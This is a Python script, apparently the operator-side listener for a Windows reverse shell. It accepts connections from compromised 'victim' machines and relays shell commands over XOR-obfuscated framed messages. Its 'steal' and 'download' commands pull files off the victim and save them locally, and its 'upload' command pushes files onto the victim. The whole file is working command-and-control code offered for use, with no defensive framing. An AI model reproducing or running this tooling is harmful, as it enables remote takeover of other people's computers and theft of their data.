#!/usr/bin/env python3
# listener.py - Enhanced listener for Windows reverse shell
# Features: colored output, local command execution (!), automatic file saving for downloads/steal

# -------------------- IMPORTS --------------------
import socket               # TCP server socket
import sys                  # System exit and command execution
import base64               # Decode file chunks received from victim
import os                   # File system operations and local command execution
import time                 # Generate timestamps for default filenames

# -------------------- CONFIGURATION --------------------
LISTEN_IP = "0.0.0.0"       # Listen on all available network interfaces
LISTEN_PORT = 4444          # Port to listen on (must match client's ATTACKER_PORT)
XOR_KEY = 0x42              # Static XOR key – must match client's X0R_KEY

# -------------------- ANSI COLOR CODES (OPTIONAL) --------------------
# Used to improve readability of the terminal output.
COLOR_RESET = "\033[0m"
COLOR_GREEN = "\033[92m"
COLOR_RED = "\033[91m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_CYAN = "\033[96m"

# -------------------- ENCRYPTION / FRAMING --------------------

def xor_encrypt_decrypt(data: bytes) -> bytes:
    """
    Apply XOR cipher to the given data using the global XOR_KEY.
    Symmetric operation: same function encrypts and decrypts.
    """
    return bytes([b ^ XOR_KEY for b in data])

def send_encrypted(sock: socket.socket, data):
    """
    Send data over the socket after encrypting it and prefixing with length.
    Protocol: [4-byte big-endian length] + [XORed payload]
    Accepts either string (encoded to UTF-8) or bytes.
    """
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted = xor_encrypt_decrypt(data)
    sock.send(len(encrypted).to_bytes(4, 'big'))
    sock.send(encrypted)

def recv_encrypted(sock: socket.socket) -> str | None:
    """
    Receive an encrypted message from the socket.
    Returns the decrypted UTF-8 string, or None if connection is closed.
    """
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = int.from_bytes(raw_len, 'big')
    data = b''
    # Read exactly 'length' bytes, handling partial reads
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            break
        data += chunk
    return xor_encrypt_decrypt(data).decode('utf-8', errors='replace')

# -------------------- FILE RECEPTION --------------------

def receive_file(sock: socket.socket, filename: str) -> tuple[bool, str]:
    """
    Receive a file from the victim using the custom protocol:
    Expects the stream to start with "FILE_START", then base64 chunks,
    and finally "FILE_END". Decodes and writes the data to 'filename'.
    Returns (True, success_message) or (False, error_message).
    """
    line = recv_encrypted(sock)
    if line != "FILE_START":
        return False, f"Error: expected FILE_START, received {line}"
    try:
        with open(filename, 'wb') as f:
            while True:
                part = recv_encrypted(sock)
                if part is None:
                    return False, "Connection closed during reception"
                if part == "FILE_END":
                    break
                f.write(base64.b64decode(part))
        size = os.path.getsize(filename)
        return True, f"File saved as {filename} ({size} bytes)"
    except Exception as e:
        return False, f"Error saving file: {e}"

# -------------------- MAIN SERVER LOOP --------------------

def main():
    # Create a TCP socket and set SO_REUSEADDR to avoid "Address already in use"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(1)
    print(f"{COLOR_GREEN}[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...{COLOR_RESET}")

    while True:
        client, addr = server.accept()
        print(f"{COLOR_GREEN}[+] Connection received from {addr[0]}:{addr[1]}{COLOR_RESET}")
        try:
            # Receive and display the initial banner from the victim
            banner = recv_encrypted(client)
            if banner:
                print(f"{COLOR_CYAN}[+] {banner}{COLOR_RESET}")

            # Command loop for this client
            while True:
                cmd = input(f"{COLOR_YELLOW}shell>{COLOR_RESET} ").strip()
                if not cmd:
                    continue

                # ---------- LOCAL COMMAND EXECUTION (prefix '!') ----------
                if cmd.startswith('!'):
                    local_cmd = cmd[1:].strip()
                    if local_cmd:
                        print(f"{COLOR_BLUE}[*] Executing locally: {local_cmd}{COLOR_RESET}")
                        os.system(local_cmd)
                    continue

                # Send the command to the victim
                send_encrypted(client, cmd)

                # ---------- HANDLE FILE TRANSFERS (steal / download) ----------
                if cmd.startswith("steal") or cmd.startswith("download"):
                    # For 'steal', the victim first sends a textual status message
                    if cmd.startswith("steal"):
                        first_response = recv_encrypted(client)
                        if first_response is None:
                            print(f"{COLOR_RED}[!] Connection closed{COLOR_RESET}")
                            break
                        print(first_response)
                    # Determine a default filename for saving
                    if cmd.startswith("download"):
                        default_filename = cmd[9:].strip()
                    else:  # steal
                        timestamp = time.strftime("%Y%m%d_%H%M%S")
                        default_filename = f"steal_{timestamp}.zip"
                    save_path = input(
                        f"{COLOR_YELLOW}Save file as (default: {default_filename}): {COLOR_RESET}"
                    ).strip()
                    if not save_path:
                        save_path = default_filename
                    success, msg = receive_file(client, save_path)
                    if success:
                        print(f"{COLOR_GREEN}[+] {msg}{COLOR_RESET}")
                    else:
                        print(f"{COLOR_RED}[-] {msg}{COLOR_RESET}")
                    continue

                # ---------- HANDLE UPLOAD COMMAND ----------
                if cmd.startswith("upload "):
                    filename = cmd[7:].strip()
                    # Wait for the victim to signal readiness
                    ready = recv_encrypted(client)
                    if ready != "READY_FOR_UPLOAD":
                        print(f"{COLOR_RED}[!] Unexpected response: {ready}{COLOR_RESET}")
                        continue
                    # Send the local file
                    try:
                        if not os.path.exists(filename):
                            print(f"{COLOR_RED}[-] Local file not found: {filename}{COLOR_RESET}")
                            send_encrypted(client, "ERROR: File not found")
                            final_response = recv_encrypted(client)
                            if final_response:
                                print(final_response)
                            continue
                        with open(filename, 'rb') as f:
                            while True:
                                chunk = f.read(3 * 1024)  # 3 KB chunks
                                if not chunk:
                                    break
                                send_encrypted(client, base64.b64encode(chunk).decode('ascii'))
                        send_encrypted(client, "FILE_END")
                    except Exception as e:
                        print(f"{COLOR_RED}[-] Error reading local file: {e}{COLOR_RESET}")
                        send_encrypted(client, f"ERROR: {e}")
                    # Receive confirmation from victim
                    final_response = recv_encrypted(client)
                    if final_response:
                        print(final_response)
                    continue

                # ---------- NORMAL COMMAND RESPONSE ----------
                response = recv_encrypted(client)
                if response is None:
                    print(f"{COLOR_RED}[!] Connection closed by client.{COLOR_RESET}")
                    break
                print(response)

        except (socket.error, ConnectionResetError) as e:
            print(f"{COLOR_RED}[-] Connection error: {e}{COLOR_RESET}")
        finally:
            client.close()
            print(f"{COLOR_RED}[*] Connection closed. Waiting for new connection...\n{COLOR_RESET}")

# -------------------- ENTRY POINT --------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{COLOR_RED}[!] Exiting...{COLOR_RESET}")
        sys.exit(0)
